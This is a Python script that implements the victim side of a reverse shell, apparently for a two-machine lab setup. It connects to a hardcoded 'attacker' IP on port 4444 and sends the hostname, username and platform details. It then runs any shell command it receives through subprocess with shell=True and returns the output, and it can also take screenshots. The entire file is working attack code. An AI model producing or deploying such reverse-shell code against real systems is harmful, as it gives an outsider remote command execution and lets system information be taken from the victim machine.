#!/usr/bin/env python3
"""
REVERSE SHELL VICTIM/CLIENT
Run on: 198.168.100.5
Target: 198.168.100.4:4444
"""
import socket
import subprocess
import os
import sys
import platform
import time


class ReverseShellVictim:
    def __init__(self, attacker_ip='198.168.100.4', attacker_port=4444):
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.socket = None
        self.running = False

    def connect(self):
        """Connect to attacker"""
        print("\n" + "=" * 50)
        print("REVERSE SHELL VICTIM")
        print("=" * 50)
        print(f"[*] Victim IP: 198.168.100.5")
        print(f"[*] Attacker: {self.attacker_ip}:{self.attacker_port}")
        print("[*] Attempting connection...")

        attempt = 1
        max_attempts = 5

        while attempt <= max_attempts and not self.running:
            print(f"\n[*] Attempt {attempt}/{max_attempts}")

            try:
                # Create socket
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)  # Connection timeout

                # Connect to attacker
                print(f"[*] Connecting to {self.attacker_ip}:{self.attacker_port}...")
                self.socket.connect((self.attacker_ip, self.attacker_port))

                # Remove timeout after successful connection
                self.socket.settimeout(None)

                self.running = True
                print(f"[+] Connected to attacker!")
                print(f"[+] Connection established at {time.ctime()}")

                # Send system info
                self.send_system_info()

                # Start command loop
                self.command_loop()

            except ConnectionRefusedError:
                print("[-] Connection refused - Attacker not listening")
                print("[*] Make sure attacker.py is running on 198.168.100.4")
            except socket.timeout:
                print("[-] Connection timeout")
            except Exception as e:
                print(f"[-] Connection error: {e}")

            # If connection failed, wait and retry
            if not self.running and attempt < max_attempts:
                print(f"[*] Retrying in 5 seconds...")
                time.sleep(5)
                attempt += 1

        if not self.running:
            print("\n[-] Failed to connect after all attempts")
            print("[*] Check:")
            print("    1. Attacker is running attacker.py")
            print("    2. Firewall is disabled on both machines")
            print("    3. Correct IP address: 198.168.100.4")
            print("    4. Both machines on same network")

    def send_system_info(self):
        """Send system information to attacker"""
        try:
            # Get system info
            system_info = f"""
[+] ====================================
[+] VICTIM SYSTEM INFORMATION
[+] ====================================
[+] Hostname: {socket.gethostname()}
[+] IP Address: 198.168.100.5
[+] Username: {os.getlogin()}
[+] Platform: {platform.system()} {platform.release()}
[+] Processor: {platform.processor()}
[+] Python: {platform.python_version()}
[+] Current Directory: {os.getcwd()}
[+] Time: {time.ctime()}
[+] ====================================\n
"""
            self.socket.send(system_info.encode())
        except:
            pass

    def command_loop(self):
        """Main command execution loop"""
        print("[+] Ready to receive commands...")

        while self.running:
            try:
                # Receive command from attacker
                command_data = self.socket.recv(4096)

                if not command_data:
                    print("[-] Connection lost")
                    break

                # Decode command
                command = command_data.decode('utf-8', errors='ignore').strip()

                # Check for exit command
                if command.lower() == "exit":
                    print("[*] Exit command received")
                    self.socket.send(b"[+] Session terminated\n")
                    break

                print(f"[*] Executing: {command}")

                # Execute command
                output = self.execute_command(command)

                # Send output back to attacker
                self.socket.send(output)

            except ConnectionResetError:
                print("[-] Connection reset by attacker")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                self.socket.send(f"[-] Error: {str(e)}\n".encode())

        self.cleanup()

    def execute_command(self, command):
        """Execute system command"""
        try:
            # Special commands
            if command.lower() == "clear":
                return b"[+] Screen cleared on victim side\n"

            if command.lower() == "screenshot":
                return self.take_screenshot()

            # Change directory command
            if command.lower().startswith("cd "):
                new_dir = command[3:].strip()
                try:
                    os.chdir(new_dir)
                    return f"[+] Changed directory to: {os.getcwd()}\n".encode()
                except Exception as e:
                    return f"[-] cd error: {str(e)}\n".encode()

            # System command
            try:
                # Execute command with timeout
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True
                )

                # Get output with timeout
                stdout, stderr = process.communicate(timeout=30)

                # Combine output
                if stdout:
                    output = stdout
                elif stderr:
                    output = stderr
                else:
                    output = "[+] Command executed successfully (no output)\n"

                # Add command prompt
                prompt = f"\n[{os.getcwd()}]> "
                return (output + prompt).encode()

            except subprocess.TimeoutExpired:
                process.kill()
                return b"[-] Command timed out (30 seconds)\n"
            except Exception as e:
                return f"[-] Command error: {str(e)}\n".encode()

        except Exception as e:
            return f"[-] Execution error: {str(e)}\n".encode()

    def take_screenshot(self):
        """Take screenshot (Windows only)"""
        try:
            import pyautogui
            timestamp = time.strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            pyautogui.screenshot(filename)
            return f"[+] Screenshot saved: {filename}\n".encode()
        except ImportError:
            return b"[-] pyautogui not installed. Install with: pip install pyautogui\n"
        except Exception as e:
            return f"[-] Screenshot error: {str(e)}\n".encode()

    def cleanup(self):
        """Cleanup resources"""
        if self.socket:
            self.socket.close()
        print("[*] Connection closed")
        print("[*] Victim stopped")


def main():
    """Main function"""
    # Configuration
    ATTACKER_IP = "198.168.100.4"  # Attacker IP address
    ATTACKER_PORT = 4444  # Attacker port

    # Create and connect victim
    victim = ReverseShellVictim(
        attacker_ip=ATTACKER_IP,
        attacker_port=ATTACKER_PORT
    )
    victim.connect()


if __name__ == "__main__":
    main()